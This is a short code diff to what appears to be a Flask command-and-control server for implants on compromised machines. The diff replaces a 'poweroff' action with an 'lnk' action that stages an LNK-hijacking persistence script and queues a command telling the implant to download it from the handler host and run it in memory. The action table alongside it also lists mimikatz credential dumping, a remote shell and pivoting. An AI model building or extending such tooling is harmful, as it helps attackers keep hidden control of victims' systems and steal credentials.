@@ -194,10 +194,16 @@ def shell(id):
     with open(f"./queue/{id}.txt","a") as file:
         file.write("\n"+payload)
 
-def poweroff():
-    print("+-----------+")
-    print("|  Poweroff |")
-    print("+-----------+")
+def lnk(id):
+    print("+--------------------+")
+    print("|  Persistence : LNK |")
+    print("+--------------------+")
+    with open('./commands_templates/lnk_hijacking.py',"r") as file:
+        data = file.read()
+    with open("./uploads/lnk_hijacking.txt","w") as file:
+        file.write(data)
+    command = f"MemRunPy:http://{handler_host}/download/?file=lnk_hijacking.txt"
+    write_command(id,command)
 
 def pivote():
     print("+-----------+")
@@ -242,7 +248,7 @@ global app
 app = Flask(__name__)
 
 global dico_action
-dico_action = {1:mimikatz,2:shell,3:poweroff,4:pivote}
+dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote}
 
 
 @app.route('/')
